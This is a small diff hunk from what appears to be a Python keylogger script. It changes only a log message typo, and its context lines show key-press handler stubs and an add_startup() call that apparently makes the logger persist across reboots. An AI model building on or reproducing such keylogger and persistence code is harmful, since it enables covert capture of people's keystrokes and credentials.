@@ -151,7 +151,7 @@ def on_press(key):
 def on_release(key):
     pass
 
-logger.info("PKEYLOGGER START]")
+logger.info("[KEYLOGGER START]")
 add_startup()
 
 # Log start time and date
